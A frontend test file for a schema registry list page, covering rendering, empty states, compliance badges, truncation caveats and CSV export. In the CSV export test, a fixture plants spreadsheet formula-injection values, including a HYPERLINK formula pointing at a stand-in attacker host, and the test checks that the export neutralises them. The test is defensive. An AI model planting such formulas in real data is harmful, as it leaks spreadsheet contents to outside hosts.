import { useEffect } from 'react';
import { render, screen, waitFor, fireEvent, within } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { MemoryRouter, useLocation } from 'react-router-dom';
import { http, HttpResponse } from 'msw';
import { setupServer } from 'msw/node';
import { SchemaListPage } from './SchemaListPage';

const API = 'http://localhost:8000/api/v1';

const SCHEMAS = [
  {
    // No `-value`/`-key` suffix: SchemaTable splits that suffix into its own
    // badge (`splitSubject`), which would break a single-text-node match.
    artifact_id: 'catalog-svc',
    group_id: 'default',
    name: 'catalog-svc',
    type: 'AVRO',
    state: 'ENABLED',
    created_on: '2026-01-01T00:00:00Z',
    modified_on: '2026-01-02T00:00:00Z',
    latest_version: '1',
    owner: { service: 'catalog-svc', team: 'product', email: null },
    domain: 'product',
    classification: 'internal',
    lifecycle: 'active',
    pii_fields: [],
  },
];

const OVERVIEW = {
  total_schemas: 1,
  schemas_with_compatibility_rules: 0,
  non_compliant_schemas: 0,
};

const server = setupServer(
  http.get(`${API}/schemas`, () =>
    HttpResponse.json({ items: SCHEMAS, total: SCHEMAS.length, limit: 500, offset: 0 }),
  ),
  http.get(`${API}/schemas/non-compliant`, () =>
    HttpResponse.json({ items: [], last_validated: null, total_checked: 0 }),
  ),
  http.get(`${API}/schemas/overview`, () => HttpResponse.json(OVERVIEW)),
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());

// Row clicks navigate now, so the tests need to see where they went. A probe
// beside the page is the least invasive way: MemoryRouter holds the location
// and nothing else in the tree reports it.
//
// Named `routed` rather than `location`, which at module scope reads as the
// browser global.
//
// Written from an EFFECT, not during render. Assigning a module-scope
// variable while rendering is a side effect in render — `react-hooks/globals`
// says so — and the value it captured depended on when React happened to
// re-render. Effects flush inside `act`, so `render` and `fireEvent` still
// leave this up to date synchronously.
let routed: { pathname: string; search: string } = { pathname: '', search: '' };

function LocationProbe() {
  const current = useLocation();
  useEffect(() => {
    routed = { pathname: current.pathname, search: current.search };
  }, [current]);
  return null;
}

const currentPath = () => routed.pathname;
const currentSearch = () => routed.search;

function renderList(initialUrl = '/schemas') {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={qc}>
      <MemoryRouter initialEntries={[initialUrl]}>
        <SchemaListPage />
        <LocationProbe />
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

it('renders schemas after loading', async () => {
  renderList();
  // 'catalog-svc' is both the subject and the owner, so more than one match
  // is expected — assert presence, not uniqueness.
  await waitFor(() => expect(screen.getAllByText('catalog-svc').length).toBeGreaterThan(0));
});

it('lands on the table with no ?view at all', async () => {
  // `all` is the default now that the tab bar is gone. Before, no `?view`
  // meant Home, and the table was one click away from every fresh visit.
  renderList('/schemas');
  await waitFor(() => expect(screen.getByRole('table')).toBeInTheDocument());
});

it('renders the table for a stale ?view=overview link rather than an empty one', async () => {
  // Home's deep links are in bookmarks. `filterSchemas` used to answer
  // `overview` with nothing, so this URL on the redesigned list would have
  // rendered an empty table reading "no schemas match" — false, and the exact
  // failure the honesty constraints exist to prevent.
  renderList('/schemas?view=overview');
  const table = await screen.findByRole('table');
  expect(within(table).getAllByText('catalog-svc').length).toBeGreaterThan(0);
  expect(screen.queryByText(/no schemas match/i)).not.toBeInTheDocument();
});

it('names the searched fields when nothing matches', async () => {
  renderList('/schemas?search=zzzzznope');
  await waitFor(() => expect(screen.getByText(/no schemas match/i)).toBeInTheDocument());
  expect(
    screen.getByText(/subject, name, domain, owner or classification/i),
  ).toBeInTheDocument();
  expect(screen.getByText('Clear search').closest('button')).toBeInTheDocument();
  // The message replaces the table (not just precedes it) — no table renders
  // while the search-empty state is showing.
  expect(screen.queryByRole('table')).not.toBeInTheDocument();
});

it('clears the search and shows the matching schema again', async () => {
  renderList('/schemas?search=zzzzznope');
  await waitFor(() => expect(screen.getByText('Clear search')).toBeInTheDocument());
  fireEvent.click(screen.getByText('Clear search'));
  await waitFor(() => expect(screen.getAllByText('catalog-svc').length).toBeGreaterThan(0));
  expect(screen.queryByText(/no schemas match/i)).not.toBeInTheDocument();
});

it('shows the unreachable message, and nothing derived, when the schema list fails', async () => {
  server.use(http.get(`${API}/schemas`, () => HttpResponse.json({ detail: 'boom' }, { status: 500 })));
  renderList();

  await waitFor(() =>
    expect(screen.getByText(/check that apicurio is reachable/i)).toBeInTheDocument(),
  );
  // Every figure on this page is derived from the list, so none of them may
  // render beside an "unreachable" panel. That includes the glance cards,
  // whose numbers come from a different endpoint that may well have answered:
  // "1 subject registered" above "Apicurio is unreachable" is incoherent.
  expect(screen.queryByRole('table')).not.toBeInTheDocument();
  expect(screen.queryByText('subjects registered')).not.toBeInTheDocument();
  expect(screen.queryByText(/subjects$/)).not.toBeInTheDocument();
});

it('a row click opens the schema page rather than a drawer', async () => {
  // The 560px drawer is retired. It had no room for the facts band, the three
  // readings of the body, the version history or the diff, and it showed a
  // different surface from the one the publish flow and the service portfolio
  // already linked to for the same schema.
  renderList();
  await waitFor(() => expect(screen.getByRole('table')).toBeInTheDocument());
  fireEvent.click(within(screen.getByRole('table')).getAllByText('catalog-svc')[0]);
  await waitFor(() =>
    expect(currentPath()).toBe('/schemas/default/catalog-svc'),
  );
  expect(screen.queryByRole('dialog')).not.toBeInTheDocument();
});

it('the compliance badge deep-links to the page Compliance tab', async () => {
  server.use(
    http.get(`${API}/schemas/non-compliant`, () =>
      HttpResponse.json({
        items: [
          {
            artifact_id: 'catalog-svc',
            group_id: 'default',
            passed: false,
            failures: [{ rule: 'metadata_block_missing', message: 'no block' }],
            validated_at: '2026-01-01T00:00:00Z',
          },
        ],
        last_validated: '2026-01-01T00:00:00Z',
        total_checked: 1,
      }),
    ),
  );
  renderList();
  const table = await screen.findByRole('table');
  fireEvent.click(within(table).getByText('non-compliant'));
  await waitFor(() =>
    expect(currentSearch()).toBe('?dtab=compliance'),
  );
  expect(currentPath()).toBe('/schemas/default/catalog-svc');
});

it('the segmented partition offers three segments and no Home', async () => {
  renderList();
  await waitFor(() => expect(screen.getByRole('table')).toBeInTheDocument());
  const tabs = screen.getAllByRole('tab');
  expect(tabs.map((t) => t.textContent)).toEqual(['All', 'Non-compliant', 'Recently changed']);
});

it('the toolbar is one row: no group-by, no sort control, no count pill', async () => {
  renderList();
  await waitFor(() => expect(screen.getByRole('table')).toBeInTheDocument());
  expect(screen.queryByText('Group by')).not.toBeInTheDocument();
  expect(screen.queryByRole('status', { name: /Showing \d+ of \d+ subjects/ })).not.toBeInTheDocument();
  expect(screen.queryByRole('button', { name: /^Sort by/ })).not.toBeInTheDocument();
  // What replaced the sort control: the column headers, which were always the
  // real sorter, and the footer, which says in words what the sort is.
  expect(screen.getByRole('button', { name: /Subject/ })).toBeInTheDocument();
  expect(screen.getByText(/sorted by subject/)).toBeInTheDocument();
});

it('Show all clears a facet that is hiding rows, and the footer says how many', async () => {
  renderList('/schemas?groupBy=domain&classification=restricted');
  // The one fixture row is `internal`, so `restricted` hides it.
  await waitFor(() => expect(screen.getByText(/no schemas match the filters/i)).toBeInTheDocument());
  fireEvent.click(screen.getByText('Clear filters'));
  const table = await screen.findByRole('table');
  expect(within(table).getAllByText('catalog-svc').length).toBeGreaterThan(0);
  // Nothing is narrowing any more, so the two figures agree and no "Show all"
  // link is offered. The prototype's "3 of 8" was its own canvas truncation.
  expect(screen.getByText(/1 of 1 domain shown/)).toBeInTheDocument();
  expect(screen.queryByText(/^Show all/)).not.toBeInTheDocument();
});

it('blames the filters, not the query, when only the filters match nothing', async () => {
  renderList('/schemas?domain=zzzzznope');
  await waitFor(() =>
    expect(screen.getByText(/no schemas match the filters/i)).toBeInTheDocument(),
  );
  // `Clear filters` is the toolbar's, which stays visible over the empty
  // state; the empty state no longer duplicates the label.
  expect(screen.getByText('Clear filters').closest('button')).toBeInTheDocument();
  expect(screen.queryByText('Clear search')).not.toBeInTheDocument();
  expect(screen.queryByRole('table')).not.toBeInTheDocument();
});

it('names both when a search and a filter are set and nothing matches', async () => {
  renderList('/schemas?search=catalog&domain=zzzzznope');
  await waitFor(() =>
    expect(screen.getByText(/with the filters you have set/i)).toBeInTheDocument(),
  );
  expect(screen.getByText('Clear search').closest('button')).toBeInTheDocument();
  expect(screen.getByText('Clear filters').closest('button')).toBeInTheDocument();
});

// The glance card and the table read the same fact off two different queries.
// A failed compliance query leaves `nonCompliantIds` empty — because nothing
// came back, not because everything passed — so the card must not report a
// figure the table beside it is rendering as `unknown`.
it('does not report a non-compliant count when the compliance fetch fails', async () => {
  server.use(http.get(`${API}/schemas/non-compliant`, () => HttpResponse.error()));
  renderList();

  await waitFor(() => expect(screen.getByText('subjects registered')).toBeInTheDocument());
  await waitFor(() =>
    expect(screen.getByText(/couldn’t load/i)).toBeInTheDocument(),
  );
  // The other two cards came from a query that did answer.
  expect(screen.getByText('0 of 1')).toBeInTheDocument();
});

// An empty `nonCompliantIds` from a FAILED compliance query must not mark
// every row compliant. The table's own "compliant" badge is the most
// per-row-repeated claim in the product, so a silent all-clear here is the
// same fault as a green percentage, multiplied by the row count.
it('marks rows unknown, not compliant, when the compliance fetch fails', async () => {
  server.use(http.get(`${API}/schemas/non-compliant`, () => HttpResponse.error()));
  renderList();

  const table = await screen.findByRole('table');
  await waitFor(() => expect(within(table).getByText('unknown')).toBeInTheDocument());
  expect(within(table).queryByText('compliant')).not.toBeInTheDocument();
});

// `refreshNonCompliant` had had no caller since NonCompliantSchemasPage was
// deleted — the POST endpoint was live and unreachable from the UI.
it('the refresh button re-checks compliance through the refresh endpoint', async () => {
  let posted = 0;
  server.use(
    http.post(`${API}/schemas/non-compliant/refresh`, () => {
      posted += 1;
      return HttpResponse.json({ items: [], last_validated: null, total_checked: 1 });
    }),
  );
  renderList();
  await waitFor(() => expect(screen.getByRole('table')).toBeInTheDocument());
  fireEvent.click(screen.getByRole('button', { name: /re-check compliance/i }));
  await waitFor(() => expect(posted).toBe(1));
});

// The Non-compliant segment is computed FROM the compliance list, so when
// that query fails the segment has no input at all. `nonCompliantIds` is
// empty either way, so the filter returned nothing and the table said "No
// schemas match the current filters." — a clean bill of health delivered at
// the exact moment every row on All correctly reads `unknown`.
it('does not read as an all-clear when the compliance fetch fails on that segment', async () => {
  server.use(http.get(`${API}/schemas/non-compliant`, () => HttpResponse.error()));
  renderList('/schemas?view=non-compliant');

  await waitFor(() =>
    expect(screen.getByText('Could not load the compliance list')).toBeInTheDocument(),
  );
  expect(screen.queryByText('No schemas match the current filters.')).not.toBeInTheDocument();
});

// And a segment that really is empty must still say so — the two states have
// to stay distinguishable in both directions.
it('still says nothing matches when the compliance query answers and nothing does', async () => {
  renderList('/schemas?view=non-compliant');

  await waitFor(() =>
    expect(screen.getByText('No schemas match the current filters.')).toBeInTheDocument(),
  );
  expect(screen.queryByText('Could not load the compliance list')).not.toBeInTheDocument();
});

// A failed query must not change the OTHER segments' empty states: they are
// built from the schema list alone and owe compliance nothing.
it('leaves the recently-changed segment reading as a filter result', async () => {
  server.use(http.get(`${API}/schemas/non-compliant`, () => HttpResponse.error()));
  renderList('/schemas?view=recently-changed');

  await waitFor(() =>
    expect(screen.getByText('No schemas match the current filters.')).toBeInTheDocument(),
  );
  expect(screen.queryByText('Could not load the compliance list')).not.toBeInTheDocument();
});

// Every value in the CSV comes from schema metadata a publisher supplies
// through the publish form, and Excel strips CSV quoting BEFORE deciding
// whether a cell is a formula. So quoting alone was not a defence: a subject
// registered with an owner CI of `=HYPERLINK(...)` became a live formula in
// whoever's spreadsheet opened the export.
describe('CSV export', () => {
  // jsdom's Blob exposes no text(), so the CSV is captured where it is built.
  function captureCsv() {
    const parts: string[] = [];
    const RealBlob = globalThis.Blob;
    class CapturingBlob extends RealBlob {
      constructor(chunks: BlobPart[] = [], options?: BlobPropertyBag) {
        parts.push(chunks.map(String).join(''));
        super(chunks, options);
      }
    }
    vi.stubGlobal('Blob', CapturingBlob);
    Object.assign(URL, {
      createObjectURL: vi.fn().mockReturnValue('blob:csv'),
      revokeObjectURL: vi.fn(),
    });
    return parts;
  }

  afterEach(() => vi.unstubAllGlobals());

  it('neutralises a cell a spreadsheet would run as a formula', async () => {
    server.use(
      http.get(`${API}/schemas`, () =>
        HttpResponse.json({
          items: [
            {
              ...SCHEMAS[0],
              artifact_id: 'commerce.order.placed-value',
              owner: { service: '=HYPERLINK("http://evil.example/"&A1)', team: null, email: null },
              domain: '+1+1',
              lifecycle: '-2',
              classification: '@SUM(A1)',
            },
          ],
          total: 1,
          limit: 500,
          offset: 0,
        }),
      ),
    );

    const parts = captureCsv();
    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    renderList();

    fireEvent.click(
      await screen.findByLabelText('Select commerce.order.placed-value'),
    );
    fireEvent.click(screen.getByText('Export CSV'));

    const csv = parts.join('');
    // Each risky value carries Excel's own literal marker, inside the quotes.
    expect(csv).toContain(`"'=HYPERLINK(""http://evil.example/""&A1)"`);
    expect(csv).toContain(`"'+1+1"`);
    expect(csv).toContain(`"'-2"`);
    expect(csv).toContain(`"'@SUM(A1)"`);
    // No cell opens with a bare formula character.
    expect(csv.split('\n').slice(1).join('\n')).not.toMatch(/(^|,)"[=+\-@]/);

    click.mockRestore();
  });

  it('leaves an ordinary value exactly as it is', async () => {
    const parts = captureCsv();
    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});
    renderList();

    fireEvent.click(await screen.findByLabelText('Select catalog-svc'));
    fireEvent.click(screen.getByText('Export CSV'));

    const csv = parts.join('');
    expect(csv).toContain('"catalog-svc"');
    expect(csv).not.toContain("\"'catalog-svc\"");

    click.mockRestore();
  });
});

// `AppShell` guards its own stored flag and says why; this page's density did
// not. With no error boundary anywhere in the tree, a throw from
// `localStorage` during the useState initialiser unmounts the whole app to a
// blank page.
describe('remembered row density', () => {
  afterEach(() => {
    vi.restoreAllMocks();
    localStorage.clear();
  });

  it('renders when reading storage throws, instead of blanking the app', async () => {
    // What a private window or blocked site data actually does: throw, not
    // return null.
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => {
      throw new DOMException('The operation is insecure.', 'SecurityError');
    });

    renderList();
    expect(await screen.findByRole('table')).toBeInTheDocument();
  });

  it('renders when writing storage throws', async () => {
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => {
      throw new DOMException('QuotaExceededError', 'QuotaExceededError');
    });

    renderList();
    const table = await screen.findByRole('table');
    // Safari private browsing reads fine and throws on write, so the crash
    // arrived on a click rather than on load.
    fireEvent.click(screen.getByRole('button', { name: /cozy/i }));
    expect(table).toBeInTheDocument();
  });

  it('ignores a stored value that is not a density', async () => {
    // Cast rather than checked, an unrecognised value flowed through as a
    // density: the table fell to its cozy branch while the toolbar showed
    // NEITHER button pressed, because that control compares for equality.
    localStorage.setItem('schema-density', 'spacious');
    renderList();
    await screen.findByRole('table');
    expect(screen.getByRole('button', { name: /compact rows/i })).toHaveAttribute(
      'aria-pressed',
      'true',
    );
    expect(screen.getByRole('button', { name: /cozy rows/i })).toHaveAttribute(
      'aria-pressed',
      'false',
    );
  });

  it('still honours a stored value that is one', async () => {
    localStorage.setItem('schema-density', 'cozy');
    renderList();
    await screen.findByRole('table');
    expect(screen.getByRole('button', { name: /cozy rows/i })).toHaveAttribute(
      'aria-pressed',
      'true',
    );
  });
});

// Selecting rows then narrowing the list must not leave a selection standing
// for rows that are no longer on screen — "Export CSV" in that state would
// write out rows the reader cannot see.
//
// This used to be an effect, which runs AFTER paint, so the bar showed the
// old count for a frame. It is a render-time reset now; the behaviour is the
// same and had no test either way.
describe('selection across a filter change', () => {
  it('clears the selection when the filter moves', async () => {
    renderList();
    const table = await screen.findByRole('table');
    fireEvent.click(within(table).getByLabelText('Select catalog-svc'));
    expect(screen.getByText(/1 selected/)).toBeInTheDocument();

    // Through the state segments, which are on this page. The search field
    // belongs to the app header, so it is not in this tree.
    fireEvent.click(screen.getByRole('tab', { name: /recently changed/i }));

    await waitFor(() => expect(screen.queryByText(/selected/)).not.toBeInTheDocument());
  });

  it('keeps the selection when nothing about the filter changed', async () => {
    // The reset must key on the filter, not fire on every render.
    renderList();
    const table = await screen.findByRole('table');
    fireEvent.click(within(table).getByLabelText('Select catalog-svc'));
    expect(screen.getByText(/1 selected/)).toBeInTheDocument();

    fireEvent.click(screen.getByRole('button', { name: /cozy rows/i }));
    expect(screen.getByText(/1 selected/)).toBeInTheDocument();
  });
});

// The fetch asks for 500, the BFF's own ceiling, and there is no pagination.
// Past that the table holds a slice of the registry while every figure it
// prints — the domain count, "Show all n", "No schemas match" — describes
// that slice as the whole thing.
describe('a registry larger than one page', () => {
  function truncatedList(loaded: number, total: number) {
    const items = Array.from({ length: loaded }, (_, i) => ({
      ...SCHEMAS[0],
      artifact_id: `product.item-${String(i).padStart(4, '0')}-value`,
    }));
    return http.get(`${API}/schemas`, () =>
      HttpResponse.json({ items, total, limit: 500, offset: 0 }),
    );
  }

  it('says how much of the registry is actually loaded', async () => {
    server.use(truncatedList(3, 1204));
    renderList();

    await waitFor(() => expect(screen.getByRole('table')).toBeInTheDocument());
    expect(screen.getByText(/3 of 1204 subjects loaded/)).toBeInTheDocument();
  });

  it('says nothing about a slice when the whole registry is loaded', async () => {
    // The common case, and it must stay quiet: 13 of 13 needs no caveat.
    renderList();
    await waitFor(() => expect(screen.getByRole('table')).toBeInTheDocument());
    expect(screen.queryByText(/subjects loaded/)).not.toBeInTheDocument();
  });

  it('does not claim nothing matches when the match may not be loaded', async () => {
    server.use(truncatedList(3, 1204));
    renderList('/schemas?search=item-0900');

    // A search lands on the PAGE's empty state, not the table's — it
    // pre-empts it whenever a query or a facet is set, and it is the surface
    // where this matters most.
    await waitFor(() =>
      expect(screen.getByText(/No schemas match “item-0900”/)).toBeInTheDocument(),
    );
    expect(
      screen.getByText(/Only the first 3 of 1204 subjects are loaded/),
    ).toBeInTheDocument();
  });
});

// The table's own empty state, reached when a SEGMENT narrows to nothing —
// the page-level one only appears for a search or a facet.
it('carries the same caveat on the table empty state', async () => {
  server.use(
    http.get(`${API}/schemas`, () =>
      HttpResponse.json({
        items: [{ ...SCHEMAS[0], modified_on: '2020-01-01T00:00:00Z' }],
        total: 1204,
        limit: 500,
        offset: 0,
      }),
    ),
  );
  renderList('/schemas?view=recently-changed');

  await waitFor(() =>
    expect(screen.getByText('No schemas match the current filters.')).toBeInTheDocument(),
  );
  expect(screen.getByText(/Only the first 1 of 1204 subjects are loaded/)).toBeInTheDocument();
});
